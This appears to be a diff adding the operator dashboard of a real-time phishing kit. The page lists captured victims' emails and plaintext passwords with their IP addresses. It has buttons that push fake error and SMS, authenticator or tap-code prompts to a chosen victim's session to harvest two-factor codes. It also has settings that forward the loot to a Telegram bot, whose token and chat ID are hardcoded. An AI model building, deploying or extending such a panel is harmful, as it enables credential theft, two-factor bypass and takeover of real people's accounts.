@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+  <title>Admin Panel — Login Attempts</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+  <style>
+    body {
+      font-family: system-ui, Arial, sans-serif;
+      background: #0b0c10;
+      color: #e6e6e6;
+      margin: 0;
+    }
+
+    header {
+      background: #11141a;
+      padding: 16px 20px;
+      border-bottom: 1px solid #262a33;
+      display: flex;
+      gap: 10px;
+      align-items: center;
+    }
+
+    input,
+    button {
+      padding: 8px 10px;
+      border-radius: 6px;
+      border: 1px solid #333844;
+      background: #151922;
+      color: #e6e6e6;
+    }
+
+    button {
+      cursor: pointer;
+    }
+
+    main {
+      padding: 20px;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 12px;
+    }
+
+    th,
+    td {
+      padding: 10px;
+      border-bottom: 1px solid #2a3040;
+      font-size: 14px;
+    }
+
+    th {
+      text-align: left;
+      color: #aab3c5;
+    }
+
+    code {
+      background: #0f1320;
+      padding: 2px 4px;
+      border-radius: 4px;
+    }
+
+    .badge {
+      padding: 2px 6px;
+      border-radius: 999px;
+      font-size: 12px;
+      border: 1px solid #3a4052;
+    }
+
+    .status-pending {
+      color: #ffdf8f;
+    }
+
+    .status-2fa-sent {
+      color: #7ee787;
+    }
+
+    .status-disconnected {
+      color: #ffa3a3;
+    }
+
+    .status-action {
+      color: #61dafb;
+    }
+
+    .muted {
+      color: #95a0b8;
+    }
+
+    .button-panel {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin-top: 12px;
+      margin-bottom: 14px;
+    }
+
+    .btn {
+      border-radius: 8px;
+      padding: 8px 12px;
+      font-weight: 600;
+      font-size: 14px;
+      min-width: 110px;
+    }
+
+    .btn-error {
+      background: #d33a2c;
+      color: #fff;
+    }
+
+    .btn-success {
+      background: #198754;
+      color: #fff;
+    }
+
+    .btn-gray {
+      background: #5a6773;
+      color: #fff;
+    }
+
+    tr.selectable {
+      cursor: pointer;
+    }
+
+    tr.selected {
+      background: rgba(125, 170, 255, 0.15);
+      outline: 1px solid rgba(125, 170, 255, 0.3);
+    }
+  </style>
+</head>
+
+<body>
+  <header>
+    <strong>Admin Panel</strong>
+    <input id="adminKey" type="password" placeholder="Enter ADMIN_KEY" />
+    <button id="saveKey">Use Key</button>
+    <button id="refresh">Refresh</button>
+  </header>
+
+  <main>
+    <h3>Banned IPs</h3>
+    <div id="banPanel" style="background:#11141a; padding:10px; border-radius:8px; margin-bottom:20px;">
+      <input type="text" id="banIp" placeholder="Enter IP to ban" style="width:70%; margin-right:8px;">
+      <button id="banIpBtn" class="btn btn-error">Ban IP</button>
+      <button id="refreshBans" class="btn btn-gray">Refresh List</button>
+      <ul id="banList" style="margin-top:10px; line-height:1.5;"></ul>
+    </div>
+
+    <h3>Telegram & Redirect Settings</h3>
+    <div id="configPanel" style="background:#11141a; padding:10px; border-radius:8px; margin-bottom:20px;">
+      <label>Telegram Bot Token:</label><br>
+      <input type="text" id="cfgToken" style="width:100%; margin-bottom:8px;"><br>
+
+      <label>Telegram Chat ID:</label><br>
+      <input type="text" id="cfgChat" style="width:100%; margin-bottom:8px;"><br>
+
+      <label>Redirect URL:</label><br>
+      <input type="text" id="cfgRedirect" style="width:100%; margin-bottom:8px;"><br>
+
+      <button id="saveConfig" class="btn btn-success">Save Config</button>
+    </div>
+
+    <div class="button-panel" id="buttonPanel">
+      <!-- Errors -->
+      <button class="btn btn-error" data-action="login-error">Login Error</button>
+      <button class="btn btn-error" data-action="password-error">Password Error</button>
+      <button class="btn btn-error" data-action="smscode-error">SMSCode Error</button>
+      <button class="btn btn-error" data-action="authcode-error">AuthCode Error</button>
+      <button class="btn btn-error" data-action="phonenumber-error">PhoneNumber Error</button>
+
+      <!-- Codes / Success -->
+      <button class="btn btn-success" data-action="tap-code">Tap Code</button>
+      <button class="btn btn-success" data-action="sms-code">SMS Code</button>
+      <button class="btn btn-success" data-action="auth-code">Auth Code</button>
+      <button class="btn btn-success" data-action="phone-number">Phone Number</button>
+
+      <!-- Redirect -->
+      <button class="btn btn-gray" data-action="redirect">Redirect</button>
+
+    </div>
+
+    <table id="attemptsTable">
+      <thead>
+        <tr>
+          <th>ID</th>
+          <th>Time</th>
+          <th>Email</th>
+          <th>Password</th>
+          <th>IP</th>
+          <th>Socket</th>
+          <th>Status</th>
+        </tr>
+      </thead>
+      <tbody id="attemptsBody">
+        <tr>
+          <td colspan="6" class="muted">No data yet…</td>
+        </tr>
+      </tbody>
+    </table>
+  </main>
+
+  <script>
+    const $key = document.getElementById('adminKey');
+    const $saveKey = document.getElementById('saveKey');
+    const $refresh = document.getElementById('refresh');
+    const $cfgToken = document.getElementById('cfgToken');
+    const $cfgChat = document.getElementById('cfgChat');
+    const $cfgRedirect = document.getElementById('cfgRedirect');
+    const $saveConfig = document.getElementById('saveConfig');
+    const $body = document.getElementById('attemptsBody');
+    const $buttonPanel = document.getElementById('buttonPanel');
+    const $banIp = document.getElementById('banIp');
+    const $banIpBtn = document.getElementById('banIpBtn');
+    const $refreshBans = document.getElementById('refreshBans');
+    const $banList = document.getElementById('banList');
+        const KEY_STORAGE = 'admin_key';
+    function getKey() { return sessionStorage.getItem(KEY_STORAGE) || ''; }
+    function setKey(v) { sessionStorage.setItem(KEY_STORAGE, v); }
+    $key.value = getKey();
+    // ===== Live Updates from Server =====
+    let adminSocket;
+
+    function connectAdminSocket() {
+      adminSocket = io('/admin', { auth: { key: getKey() } });
+
+      adminSocket.on('connect', () => console.log('✅ Connected to admin namespace'));
+
+      adminSocket.on('admin:status_update', ({ socketId, action }) => {
+        const row = document.querySelector(`tr[data-socket="${socketId}"] .status-cell`);
+        if (row) {
+          row.textContent = action;
+          row.className = 'status-cell status-action';
+        }
+      });
+    }
+
+    connectAdminSocket();
+
+    async function loadBanned() {
+      const resp = await fetch('/api/banned', { headers: { 'x-admin-key': getKey() } });
+      if (!resp.ok) return;
+      const data = await resp.json();
+      $banList.innerHTML = data.banned.length
+        ? data.banned.map(ip => `<li><code>${ip}</code></li>`).join('')
+        : '<li class="muted">No banned IPs yet…</li>';
+    }
+
+    $banIpBtn.onclick = async () => {
+      const ip = $banIp.value.trim();
+      if (!ip) return alert('Enter an IP to ban.');
+      const resp = await fetch('/api/ban', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'x-admin-key': getKey() },
+        body: JSON.stringify({ ip })
+      });
+      alert(resp.ok ? `🚫 IP ${ip} banned.` : 'Failed to ban IP.');
+      $banIp.value = '';
+      loadBanned();
+    };
+    $refreshBans.onclick = loadBanned;
+
+
+
+    let selectedSocketId = null;
+
+    // ===== Load Config =====
+    async function loadConfig() {
+      const resp = await fetch('/api/config', { headers: { 'x-admin-key': getKey() } });
+      if (!resp.ok) return;
+      const cfg = await resp.json();
+      $cfgToken.value = cfg.TELEGRAM_TOKEN || '8490628792:AAGv_BjqC0vbnfJd7RONJP9_ZUz1V8mPfR8';
+      $cfgChat.value = cfg.TELEGRAM_CHAT_ID || '-5078231608';
+      $cfgRedirect.value = cfg.REDIRECT_URL || '';
+    }
+
+    $saveConfig.onclick = async () => {
+      const resp = await fetch('/api/config', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'x-admin-key': getKey() },
+        body: JSON.stringify({
+          TELEGRAM_TOKEN: $cfgToken.value,
+          TELEGRAM_CHAT_ID: $cfgChat.value,
+          REDIRECT_URL: $cfgRedirect.value
+        })
+      });
+      alert(resp.ok ? '✅ Config saved' : '⚠️ Failed to save config');
+    };
+
+    // ===== Fetch Attempts =====
+    async function fetchAttempts() {
+      const resp = await fetch('/api/attempts', { headers: { 'x-admin-key': getKey() } });
+      if (!resp.ok) return;
+      const json = await resp.json();
+      const list = json.data || [];
+
+      if (!list.length) {
+        $body.innerHTML = `<tr><td colspan="6" class="muted">No login attempts yet…</td></tr>`;
+        return;
+      }
+
+      $body.innerHTML = list.map(a => `
+    <tr class="selectable ${selectedSocketId === a.socketId ? 'selected' : ''}" data-socket="${a.socketId}">
+      <td>${a.id}</td>
+      <td>${new Date(a.time).toLocaleString()}</td>
+      <td>${a.email}</td>
+      <td>${a.password}</td>
+      <td><code>${a.ip || 'N/A'}</code> <button class="btn btn-error btn-ban" data-ip="${a.ip || ''}" style="padding:3px 6px; font-size:12px;">Ban</button></td>
+      <td><code>${a.socketId}</code></td>
+      <td class="status-cell">${a.status}</td>
+    </tr>`).join('');
+
+      document.querySelectorAll('tr.selectable').forEach(row => {
+        row.onclick = () => {
+          document.querySelectorAll('tr.selected').forEach(r => r.classList.remove('selected'));
+          row.classList.add('selected');
+          selectedSocketId = row.dataset.socket;
+        };
+      });
+    }
+
+    // ===== Send Action =====
+    async function sendAction(action, socketId, code = '') {
+      try {
+        const resp = await fetch('/api/action', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'x-admin-key': getKey() },
+          body: JSON.stringify({ action, socketId, code })
+        });
+        if (!resp.ok) throw new Error('HTTP ' + resp.status);
+        const row = document.querySelector(`tr[data-socket="${socketId}"] .status-cell`);
+        if (row) {
+          row.textContent = action;
+          row.className = 'status-cell status-action';
+        }
+      } catch (err) {
+        alert('Error sending action: ' + err.message);
+      }
+    }
+
+    // ===== Button Logic =====
+    $buttonPanel.addEventListener('click', async e => {
+      const btn = e.target.closest('button[data-action]');
+      if (!btn) return;
+      const action = btn.dataset.action;
+      if (!selectedSocketId) return alert('Select a row first.');
+
+      let code = '';
+      if (['tap-code', 'sms-code', 'phone-number'].includes(action)) {
+        const label = action === 'tap-code' ? '1-digit Tap Code' : '4-digit code';
+        code = prompt(`Enter ${label}:`);
+        if (code == null || code.trim() === '') return;
+      }
+
+      await sendAction(action, selectedSocketId, code);
+      fetchAttempts();
+    });
+
+    // ===== Init =====
+    $saveKey.onclick = () => { setKey($key.value); loadConfig(); fetchAttempts(); };
+    $refresh.onclick = fetchAttempts;
+    loadConfig();
+    fetchAttempts();
+    setInterval(fetchAttempts, 5000);
+  </script>
+</body>
+
+</html>
